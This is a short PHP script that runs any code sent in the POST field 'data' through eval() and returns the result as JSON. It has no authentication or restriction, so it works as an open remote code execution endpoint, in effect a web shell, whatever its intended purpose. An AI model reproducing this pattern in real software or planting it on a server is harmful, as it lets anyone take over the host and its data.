<?php

if(!isset($_POST['data'])){
    die();
}
$data = $_POST['data'];

function run_code($data)
{
    try {
        $reponse['success'] = true;
        $reponse['result'] = eval($data);
        return $reponse;
    } catch (Throwable $e) {
        $reponse['success'] = false;
        $reponse['result'] = 'Caught exception: ' . $e->getMessage();
        return $reponse;
    }
}

$reponse = run_code($data);

$json = json_encode($reponse);

header('Content-Type: application/json');

echo $json;
